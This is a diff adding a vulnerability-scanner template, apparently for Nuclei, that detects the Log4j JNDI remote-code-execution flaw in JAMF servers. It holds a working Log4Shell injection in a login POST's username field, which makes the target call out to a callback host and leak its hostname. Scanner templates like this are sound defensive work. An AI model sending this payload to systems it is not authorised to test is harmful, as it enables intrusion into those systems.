@@ -1,0 +1,39 @@
+id: jamf-log4j-jndi-rce
+
+info:
+  name: JAMF Log4j JNDI RCE
+  author: pdteam
+  severity: critical
+  reference:
+    - https://github.com/random-robbie/jamf-log4j
+  tags: rce,jndi,log4j,jamf
+
+requests:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
